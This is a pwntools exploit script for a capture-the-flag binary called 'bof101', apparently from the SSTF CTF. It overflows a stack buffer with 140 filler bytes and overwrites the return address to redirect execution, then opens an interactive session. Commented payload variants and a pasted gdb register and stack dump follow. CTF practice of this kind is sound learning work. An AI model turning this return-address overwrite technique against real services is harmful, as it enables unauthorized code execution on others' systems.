from pwn import *

elf = ELF('./bof101')
# io = process('./bof101')
# io = gdb.debug('./bof101', 'start')
io = remote('bof101.sstf.site', '1337')
context.binary = elf

# payload = b'A' * 140 + pack(0xdeadbeef) + pack(0x4011f6) * 200
payload = b'A' * 140 + pack(0xdeadbeef)
# payload += pack(0x4012c9) + b'$AAnAACAA-AA(AADAA'
# payload += b'$AAnAACAA-AA(AADAA'
payload += b'A' * 4
payload += pack(0x4011f6)
# payload += b'$AAn\xc9\x12\x40\x00\x00\x00\x00\x00(AADAA'
io.sendline(payload)

# 0x6e41412400000000
io.interactive()

"""
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7fa6aee5daa0 --> 0xfbad2088 
RDX: 0x0 
RSI: 0xa ('\n')
RDI: 0x7ffdbc25b0a0 --> 0x0 
RBP: 0x7ffdbc25b670 --> 0x2541414100000000 ('')
RSP: 0x7ffdbc25b5e0 ('A' <repeats 140 times>, <incomplete sequence \336>)
RIP: 0x4012c8 (<main+126>:      leave)
R8 : 0x0 
R9 : 0x18696b0 ('A' <repeats 140 times>, <incomplete sequence \336>)
R10: 0xffffffffffffff80 
R11: 0x0 
R12: 0x7ffdbc25b788 --> 0x7ffdbc25d3d9 ("./bof101")
R13: 0x40124a (<main>:  endbr64)
R14: 0x0 
R15: 0x7fa6aeeac040 --> 0x7fa6aeead2e0 --> 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4012b9 <main+111>: mov    edi,0x0
   0x4012be <main+116>: call   0x401100 <exit@plt>
   0x4012c3 <main+121>: mov    eax,0x0
=> 0x4012c8 <main+126>: leave  
   0x4012c9 <main+127>: ret    
   0x4012ca:    nop    WORD PTR [rax+rax*1+0x0]
   0x4012d0 <__libc_csu_init>:  endbr64 
   0x4012d4 <__libc_csu_init+4>:        push   r15
[------------------------------------stack-------------------------------------]
0000| 0x7ffdbc25b5e0 ('A' <repeats 140 times>, <incomplete sequence \336>)
0008| 0x7ffdbc25b5e8 ('A' <repeats 132 times>, <incomplete sequence \336>)
0016| 0x7ffdbc25b5f0 ('A' <repeats 124 times>, <incomplete sequence \336>)
0024| 0x7ffdbc25b5f8 ('A' <repeats 116 times>, <incomplete sequence \336>)
0032| 0x7ffdbc25b600 ('A' <repeats 108 times>, <incomplete sequence \336>)
0040| 0x7ffdbc25b608 ('A' <repeats 100 times>, <incomplete sequence \336>)
0048| 0x7ffdbc25b610 ('A' <repeats 92 times>, <incomplete sequence \336>)
0056| 0x7ffdbc25b618 ('A' <repeats 84 times>, <incomplete sequence \336>)
[------------------------------------------------------------------------------]
"""